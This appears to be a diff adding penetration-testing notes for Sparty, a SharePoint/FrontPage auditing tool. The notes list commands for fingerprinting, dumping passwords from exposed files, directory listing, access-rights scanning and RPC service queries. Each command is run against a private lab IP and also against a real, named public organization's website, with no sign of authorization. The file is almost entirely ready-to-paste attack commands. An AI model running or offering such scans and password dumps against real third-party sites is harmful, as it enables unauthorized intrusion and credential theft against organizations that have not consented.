@@ -1,0 +1,75 @@
+################
+# Using Sparty #
+################
+cd ~/toolz
+
+git clone https://github.com/adityaks/sparty.git
+
+cd sparty/sparty_v_0.1/
+
+
+[*] Sparty - Usage Parameters and Help !
+
+python sparty_v_0.1.py -h
+
+
+[*] Sharepoint/ Frontpage Version Fingerprinting !
+
+python sparty_v_0.1.py -v ms_frontpage -u http://172.31.43.151 
+
+python sparty_v_0.1.py -v ms_frontpage -u https://www.virginiaaquarium.com/
+
+
+[*] Dumping Passwords from Exposed Files !
+
+python sparty_v_0.1.py -d dump -u http://172.31.43.151 
+
+python sparty_v_0.1.py -d dump -u https://www.virginiaaquarium.com/
+
+
+
+[*] Indexing Check for Critical Directories !
+
+python sparty_v_0.1.py -l list -u http://172.31.43.151 
+
+python sparty_v_0.1.py -l list -u https://www.virginiaaquarium.com
+
+
+
+[*] Scanning Access Rights on Frontpage Files (_vti_pvt and _vti_bin directories) !
+
+python sparty_v_0.1.py -f pvt -u http://172.31.43.151
+
+python sparty_v_0.1.py -f pvt -u https://www.virginiaaquarium.com
+
+
+
+[*] Scanning Access Rights on Sharepoint Files (forms, layouts and catalogs directories) !
+
+python sparty_v_0.1.py -s layouts -u http://172.31.43.151
+
+python sparty_v_0.1.py -s layouts -u https://www.virginiaaquarium.com
+
+
+
+[*] Exposed Services Check !
+
+python sparty_v_0.1.py -i services -u https://172.31.43.151
+
+python sparty_v_0.1.py -i services -u https://www.virginiaaquarium.com
+
+
+
+[*] Frontpage RPC Querying !
+
+python sparty_v_0.1.py -e rpc_version_check -u https://172.31.43.151
+
+python sparty_v_0.1.py -e rpc_version_check -u https://www.virginiaaquarium.com
+
+
+
+[*] Frontpage - Service Listing !
+
+python sparty_v_0.1.py -e rpc_service_listing -u http://172.31.43.151
+
+python sparty_v_0.1.py -e rpc_service_listing -u https://www.virginiaaquarium.com
